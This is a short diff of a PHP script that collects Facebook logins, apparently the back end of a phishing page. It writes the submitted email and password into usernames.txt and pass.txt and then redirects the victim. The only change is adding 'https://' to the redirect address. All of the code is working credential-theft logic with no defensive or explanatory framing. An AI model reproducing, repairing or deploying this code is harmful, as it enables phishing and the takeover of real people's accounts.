@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Facebook Username : " . $email = $_POST['ema
 ?>
 <?php
 file_put_contents("pass.txt", "Facebook Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
